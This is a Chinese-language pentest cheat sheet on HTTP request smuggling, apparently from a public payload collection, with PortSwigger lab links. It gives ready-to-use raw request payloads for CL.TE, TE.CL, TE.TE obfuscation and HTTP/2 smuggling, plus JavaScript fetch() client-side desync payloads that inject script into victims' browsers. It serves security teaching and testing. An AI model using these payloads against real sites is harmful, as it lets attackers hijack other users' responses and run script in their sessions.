# 请求走私

> HTTP 请求走私发生在多个“实体”处理一个请求时，但它们对如何确定请求的开始/结束存在分歧。这种分歧可以被用来干扰另一个用户的请求/响应，或者绕过安全控制。它通常由于优先考虑不同的 HTTP 头部（Content-Length vs Transfer-Encoding）、处理格式错误的头部时的差异（例如是否忽略带有意外空格的头部）、降级到较旧协议的请求，或在部分请求超时并应被丢弃的时间点不同而发生。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [CL.TE 漏洞](#clte-漏洞)
    * [TE.CL 漏洞](#tecl-漏洞)
    * [TE.TE 漏洞](#tete-漏洞)
    * [HTTP/2 请求走私](#http2-请求走私)
    * [客户端解同步](#客户端解同步)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - 专为 Burp Suite 设计的扩展程序，用于帮助发起 HTTP 请求走私攻击。
* [defparam/Smuggler](https://github.com/defparam/smuggler) - 用 Python 3 编写的 HTTP 请求走私/解同步测试工具。
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - 此工具是为 Burp Suite 实践者认证考试和 HTTP 请求走私实验室开发的。

## 方法论

如果你想要手动利用 HTTP 请求走私，你会遇到一些问题，特别是在 TE.CL 漏洞中，你必须计算第二个请求（恶意请求）的块大小，正如 PortSwigger 建议的那样，“手动修复请求走私攻击中的长度字段可能会很棘手。”

### CL.TE 漏洞

> 前端服务器使用 Content-Length 头部，后端服务器使用 Transfer-Encoding 头部。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL 漏洞

> 前端服务器使用 Transfer-Encoding 头部，后端服务器使用 Content-Length 头部。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: 要使用 Burp Repeater 发送此请求，首先需要进入 Repeater 菜单，并确保未勾选“更新 Content-Length”选项。你需要在最后一个 0 后面包含尾随序列 `\r\n\r\n`。

### TE.TE 漏洞

> 前端和后端服务器都支持 Transfer-Encoding 头部，但可以通过某种方式模糊化该头部，使其中一台服务器不会处理它。

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 请求走私

如果机器将你的 HTTP/2 请求转换为 HTTP/1.1，则可能发生 HTTP/2 请求走私，并且你可以将无效的 Content-Length 头部、Transfer-Encoding 头部或换行符（CRLF）走私到翻译后的请求中。如果可以将 HTTP/1.1 请求隐藏在 HTTP/2 头部中，也可能发生 HTTP/2 请求走私。

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## 客户端解同步

在某些路径上，服务器不期望收到 POST 请求，并且会将其视为简单的 GET 请求，忽略负载，例如：

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

可能会被视为两个请求，而实际上应该是一个。当后端服务器两次响应时，前端服务器会假设只有第一个响应与此请求相关。

为了利用这一点，攻击者可以使用 JavaScript 触发受害者向易受攻击的站点发送 POST 请求：

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

这可以用于：

* 让易受攻击的站点将受害者的凭据存储在攻击者可以访问的地方
* 让受害者向某个站点发送漏洞利用（例如内部站点攻击者无法访问，或使攻击更难归因）
* 让受害者运行任意 JavaScript，仿佛来自该站点

**示例**：

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // 抛出错误而不是跟随重定向
}).catch(() => {
        location = 'https://www.example.com/'
})
```

此脚本告诉受害者的浏览器向 `www.example.com/redirect` 发送一个 `POST` 请求。这会返回一个被 CORS 阻止的重定向，并导致浏览器执行 catch 块，导航到 `www.example.com`。

`www.example.com` 现在错误地处理了 `POST` 主体中的 `HEAD` 请求，而不是浏览器的 `GET` 请求，返回带有内容长度的 404 未找到响应，然后回复下一个误解的第三个请求（`GET /x?x=<script>...`），最后是浏览器的实际 `GET` 请求。
由于浏览器只发送了一个请求，它接受 `HEAD` 请求的响应作为其 `GET` 请求的响应，并将第三和第四个响应解释为响应体，从而执行攻击者的脚本。

## 实验室

* [PortSwigger - HTTP 请求走私，基本 CL.TE 漏洞](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
* [PortSwigger - HTTP 请求走私，基本 TE.CL 漏洞](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
* [PortSwigger - HTTP 请求走私，模糊化 TE 头部](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
* [PortSwigger - 通过 H2.TE 请求走私进行响应队列投毒](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
* [PortSwigger - 客户端解同步](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

## 参考文献

* [渗透测试人员指南：HTTP 请求走私 - Busra Demir - 2020 年 10 月 16 日](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [高级请求走私 - PortSwigger - 2021 年 10 月 26 日](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
* [浏览器驱动的解同步攻击：HTTP 请求走私的新领域 - James Kettle (@albinowax) - 2022 年 8 月 10 日](https://portswigger.net/research/browser-powered-desync-attacks)
* [HTTP 解同步攻击：请求走私重生 - James Kettle (@albinowax) - 2019 年 8 月 7 日](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [请求走私教程 - PortSwigger - 2019 年 9 月 28 日](https://portswigger.net/web-security/request-smuggling)